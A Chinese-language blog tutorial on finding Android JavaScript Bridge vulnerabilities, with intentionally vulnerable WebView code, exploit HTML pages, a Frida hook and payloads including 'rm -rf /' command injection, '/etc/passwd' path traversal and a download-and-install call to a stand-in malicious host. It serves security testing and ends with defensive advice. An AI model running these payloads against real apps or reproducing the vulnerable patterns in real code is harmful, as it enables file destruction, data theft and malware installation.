#  一文看懂安卓JSB风险漏洞挖掘   
原创 比心皮卡丘  暴暴的皮卡丘   2024-12-08 05:16  
  
JSB基础  
  
JavaScript Bridge（简称 JSB）是一种在移动端开发中广泛使用的技术，用于实现 JavaScript 与本地代码（如 Java 或 Kotlin）之间的通信。虽然 JSB 为混合开发提供了强大的能力，但其不当使用可能导致严重的安全问题。![](https://mmbiz.qpic.cn/mmbiz_png/kJNsfULMnLWyxFGdhfTHrBAK0Ww8mNs6AMDFvxf4OMIotLnAczJhNzcibQsqqfSnZAzCAXyXyvnuT3icIjnzVRmg/640?wx_fmt=png&from=appmsg "")  
  
  
  
本文将围绕以下内容展开：  
1. **JSB 的基本原理**  
1. **安卓中的 JSB 使用案例及代码**  
1. **JSB 的安全风险及原理分析**  
1. **漏洞挖掘示例与利用 Payload**  
## 一、JSB 的基本原理  
  
JSB 是在 WebView 环境中实现前端与本地代码交互的桥梁。其工作原理通常分为以下两种：  
### 1.1 addJavascriptInterface 方法  
  
安卓通过 WebView 的addJavascriptInterface  
 方法将 Java 对象绑定到 JavaScript 上下文中，从而允许前端页面调用指定 Java 方法。  
```
webView.addJavascriptInterface(new MyJavaScriptInterface(), "Android");

```  
  
在前端，JavaScript 可以通过window.Android.methodName()  
 调用方法。  
### 1.2 URL 拦截模式  
  
前端通过特定的 URL Scheme 发起请求，WebView 的shouldOverrideUrlLoading  
 拦截这些请求后，根据路径或参数分发到对应的本地代码逻辑。  
```
window.location.href = "jsbridge://methodName?param1=value1";

```  
  
本地代码解析 URL 并执行对应逻辑。  
  
## 二、安卓中的 JSB 使用案例及代码  
  
以下展示一个简单的 JSB 示例：  
### 2.1 使用addJavascriptInterface  
#### Java 代码  
```
public class MyJavaScriptInterface {
    @JavascriptInterface
    public void showToast(String message) {
        Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
    }
}
webView.addJavascriptInterface(new MyJavaScriptInterface(), "Android");

```  
#### JavaScript 代码  
```
function callAndroidToast() {
    window.Android.showToast("Hello from JavaScript!");
}

```  
####   
####   
### 2.2 使用 URL 拦截  
#### Java 代码  
```
webView.setWebViewClient(new WebViewClient() {
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, String url) {
        if (url.startsWith("jsbridge://")) {
            String methodName = url.split("//")[1].split("\\?")[0];
            if ("showToast".equals(methodName)) {
                Toast.makeText(context, "Triggered by URL", Toast.LENGTH_SHORT).show();
            }
            return true;
        }
        return super.shouldOverrideUrlLoading(view, url);
    }
});

```  
####   
#### JavaScript 代码  
```
function triggerAndroidViaUrl() {
    window.location.href = "jsbridge://showToast";
}

```  
####   
####   
####   
## 三、JSB 的安全风险及原理分析  
##   
### 3.1 安全风险  
1. **未授权方法调用**  
    - 风险描述：如果addJavascriptInterface  
 绑定的对象中包含敏感操作，攻击者可通过 JavaScript 恶意调用。  
  
    - 原理：@JavascriptInterface  
 暴露的所有方法对前端页面无差别开放。  
  
  
1. 风险描述：如果addJavascriptInterface  
 绑定的对象中包含敏感操作，攻击者可通过 JavaScript 恶意调用。  
  
1. 原理：@JavascriptInterface  
 暴露的所有方法对前端页面无差别开放。  
  
1. **跨域恶意注入**  
    - 风险描述：WebView 未限制加载域名，攻击者可通过恶意页面执行任意代码。  
  
    - 原理：恶意页面利用暴露的 JSB 接口调用敏感方法。  
  
  
1. 风险描述：WebView 未限制加载域名，攻击者可通过恶意页面执行任意代码。  
  
1. 原理：恶意页面利用暴露的 JSB 接口调用敏感方法。  
  
1. **数据注入与代码执行**  
    - 风险描述：通过 URL 拦截模式传递恶意参数，本地代码解析并执行时可能导致任意代码执行。  
  
    - 原理：缺乏严格的参数校验与处理机制  
  
  
1. 风险描述：通过 URL 拦截模式传递恶意参数，本地代码解析并执行时可能导致任意代码执行。  
  
1. 原理：缺乏严格的参数校验与处理机制  
  
###   
### 3.2 安全风险的详细示例  
#### 1. 未授权方法调用  
  
**风险描述**  
addJavascriptInterface  
 暴露的所有方法没有鉴权机制，攻击者可以通过恶意页面调用敏感方法，执行未经授权的操作。  
  
**漏洞代码示例**  
```
public class UnsafeInterface {
    @JavascriptInterface
    public void deleteFile(String filePath) {
        File file = new File(filePath);
        if (file.exists()) {
            file.delete();  // 未进行权限校验
        }
    }
}
webView.addJavascriptInterface(new UnsafeInterface(), "Android");

```  
  
**攻击代码**  
  
攻击者只需要在加载到的 WebView 页面中执行以下 JavaScript，即可删除目标文件：  
```
window.Android.deleteFile("/data/data/com.vulnerable.app/shared_prefs/config.xml");

```  
  
**风险分析**  
- **原理：addJavascriptInterface 暴露的方法对任何加载的页面都开放，无需身份验证，敏感操作可能被恶意利用。**  
- **影响：可能导致数据被删除、隐私泄露等问题。**  
#### 2. 跨域恶意注入  
####   
  
**风险描述**  
  
如果 WebView 加载了非可信页面或被注入恶意代码，这些页面可以利用 JSB 接口调用本地代码，执行敏感操作。  
  
**漏洞代码示例**  
```
webView.loadUrl("https://trusted.domain");  // 加载可信页面
webView.addJavascriptInterface(new SafeInterface(), "Android");
public class SafeInterface {
    @JavascriptInterface
    public String getSensitiveData() {
        return "This is sensitive data";  // 暴露敏感数据
    }
}

```  
  
**攻击场景**  
1. 恶意代码通过 XSS 注入到https://trusted.domain  
 页面。  
  
1. 恶意脚本调用暴露的接口：  
  
```
var sensitiveData = window.Android.getSensitiveData();
alert(sensitiveData);  // 弹窗显示敏感数据

```  
  
**风险分析**  
- **原理：即使页面本身可信，但如果存在 XSS 漏洞，攻击者可以借助暴露的 JSB 接口执行恶意代码。**  
- **影响：导致敏感信息泄露，如用户隐私或应用内部数据。**  
#### 3. 数据注入与代码执行  
  
**风险描述**  
  
通过 URL 拦截模式传递的参数，如果解析逻辑不安全，可能导致任意代码执行。  
  
**漏洞代码示例**  
```
webView.setWebViewClient(new WebViewClient() {
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, String url) {
        if (url.startsWith("jsbridge://")) {
            String command = Uri.parse(url).getQueryParameter("command");
            executeCommand(command);  // 存在执行注入的风险
            return true;
        }
        return super.shouldOverrideUrlLoading(view, url);
    }
    private void executeCommand(String command) {
        try {
            Runtime.getRuntime().exec(command);  // 未校验直接执行
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
});

```  
  
**攻击代码**  
  
恶意页面可以构造特定 URL，利用上述漏洞执行任意命令：  
```
window.location.href = "jsbridge://execute?command=rm -rf /";

```  
  
风险分析  
- **原理：缺乏参数校验和严格的 URL 解析逻辑，恶意参数会被直接当作命令执行。**  
- **影响：攻击者可利用此漏洞删除文件、安装恶意程序，甚至完全控制设备。**  
## 四、漏洞挖掘步骤与常用 Payload  
##   
#### 4.1 漏洞挖掘步骤  
####   
##### 1. 确定目标环境  
1. ##### 获取目标应用的安装包（APK）。  
  
1. ##### 确定是否使用了 WebView 和 JSB 技术（通过观察功能，如页面与系统功能交互行为）。  
  
##### 2. 静态分析  
- 使用**JADX**  
 或**Apktool**  
 对目标 APK 进行反编译，分析addJavascriptInterface  
 的调用点：    1. 搜索关键代码：addJavascriptInterface  
 和setWebViewClient  
。  
  
    1. 确定暴露的 Java 对象名称及其暴露的方法。  
  
  
  
- 搜索关键代码：addJavascriptInterface  
 和setWebViewClient  
。  
  
- 确定暴露的 Java 对象名称及其暴露的方法。  
  
****  
**示例代码段**  
  
通过反编译，发现以下代码：  
```
webView.addJavascriptInterface(new UnsafeInterface(), "Android");

```  
```
public class UnsafeInterface {
    @JavascriptInterface
    public void executeCommand(String command) {
        Runtime.getRuntime().exec(command);
    }
}

```  
  
**分析重点**  
- UnsafeInterface对象暴露了哪些方法？  
- 是否存在敏感功能（如文件操作、命令执行）  
  
##   
##### 3. 动态调试  
  
使用工具如**Frida**  
 或**Xposed**  
 对目标应用进行动态调试：  
1. Hook 暴露的 JSB 方法，记录前端调用的参数和实际行为。  
  
1. 分析 URL 拦截模式，检查本地解析逻辑的安全性。  
  
Frida 示例脚本  
```
Java.perform(function () {
    var UnsafeInterface = Java.use("com.vulnerable.app.UnsafeInterface");
    UnsafeInterface.executeCommand.implementation = function (command) {
        console.log("Command received: " + command);
        // 打印并替换恶意命令
        this.executeCommand("ls /data/");
    };
});

```  
##### 4. 构造恶意页面  
  
构造 HTML 文件，模拟前端调用 JSB 接口的行为：  
1. 测试所有暴露的接口是否存在安全隐患。  
  
1. 传递不同类型的参数（正常值、特殊字符、恶意命令等）。  
  
##   
##   
#### 4.2 测试案例  
####   
##### 测试场景 1：未授权方法调用  
  
构造恶意页面，通过暴露接口调用敏感方法：  
```
<!DOCTYPE html>
<html>
<head>
    <title>JSB Exploit</title>
</head>
<body>
    <script>
        // 尝试调用暴露的接口
        window.Android.deleteFile("/data/data/com.vulnerable.app/shared_prefs/config.xml");
    </script>
</body>
</html>

```  
  
**预期结果**  
  
目标文件被删除。  
  
##### 测试场景 2：数据泄露  
  
通过暴露接口获取敏感数据：  
```
<!DOCTYPE html>
<html>
<head>
    <title>JSB Data Leak</title>
</head>
<body>
    <script>
        // 获取应用的敏感数据
        var sensitiveData = window.Android.getSensitiveData();
        console.log("Sensitive Data: " + sensitiveData);
    </script>
</body>
</html>

```  
## 预期结果获取到应用内部的敏感信息，如用户凭证、配置等。  
##   
##   
##### 测试场景 3：命令注入  
  
利用 URL 拦截模式，传递恶意命令：  
```
<!DOCTYPE html>
<html>
<head>
    <title>Command Injection</title>
</head>
<body>
    <script>
        // 模拟 URL 拦截方式调用接口
        window.location.href = "jsbridge://execute?command=rm -rf /";
    </script>
</body>
</html>

```  
  
**预期结果**  
  
攻击命令被执行，导致系统文件被删除或篡改。  
## 4.3 常用 Payload  
##   
  
在漏洞挖掘过程中，我们需要根据目标接口和场景构造针对性的 Payload：  
##### Payload 示例 1：目录遍历与文件读取  
  
针对文件读取接口：  
```
window.Android.readFile("../../etc/passwd");

```  
##### Payload 示例 2：任意命令执行  
  
针对命令执行接口：  
```
window.Android.executeCommand("ls /data/data/com.vulnerable.app/");

```  
##### Payload 示例 3：恶意下载与安装  
  
通过暴露的下载接口，将恶意应用下载并安装：  
```
window.Android.downloadAndInstall("http://malicious.com/malware.apk");

```  
##   
#### 4.4 漏洞挖掘工具推荐  
####   
- **静态分析**  
    - **JADX：反编译 APK，分析代码结构。**  
    - **Apktool：解压与重编译 APK，便于修改代码和重新打包。**  
  
- **JADX：反编译 APK，分析代码结构。**  
- **Apktool：解压与重编译 APK，便于修改代码和重新打包。**  
- **动态调试**  
    - **Frida：Hook 方法调用，拦截参数与返回值。**  
    - **Xposed：对应用运行时行为进行模块化劫持与修改。**  
  
- **Frida：Hook 方法调用，拦截参数与返回值。**  
- **Xposed：对应用运行时行为进行模块化劫持与修改。**  
- **自动化扫描**  
    - **MobSF：自动化静态与动态分析工具。**  
    - **Burp Suite：拦截 WebView 加载的请求，便于分析 URL 拦截模式。**  
  
- **MobSF：自动化静态与动态分析工具。**  
- **Burp Suite：拦截 WebView 加载的请求，便于分析 URL 拦截模式。**  
##   
##   
##   
## 五、JSB 安全防护措施  
##   
1. **严格控制暴露的接口**  
    - 仅暴露必要的方法，并尽量减少使用addJavascriptInterface  
。  
  
  
1. 仅暴露必要的方法，并尽量减少使用addJavascriptInterface  
。  
  
1. **绑定安全域**  
    - 限制 WebView 加载的 URL 来源，如仅允许可信域名：  
```
webView.setWebViewClient(new WebViewClient() {
    @Override
    public void onPageFinished(WebView view, String url) {
        if (!url.startsWith("https://trusted.domain")) {
            view.stopLoading();
        }
    }
});

```  
  
    -   
    -   
    -   
    -   
    -   
    -   
    -   
    -   
    -   
  
1. 限制 WebView 加载的 URL 来源，如仅允许可信域名：  
```
webView.setWebViewClient(new WebViewClient() {
    @Override
    public void onPageFinished(WebView view, String url) {
        if (!url.startsWith("https://trusted.domain")) {
            view.stopLoading();
        }
    }
});

```  
  
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1.   
1. **输入参数校验**  
    - 对传递的参数进行严格的校验与过滤，避免注入风险。  
  
  
1. 对传递的参数进行严格的校验与过滤，避免注入风险。  
  
1. **使用更安全的通信方式**  
    - 优先考虑基于 JavaScript 的消息机制（如 WebView 的evaluateJavascript  
 方法）实现安全通信。  
  
  
  
1. 优先考虑基于 JavaScript 的消息机制（如 WebView 的evaluateJavascript  
 方法）实现安全通信。  
  
  
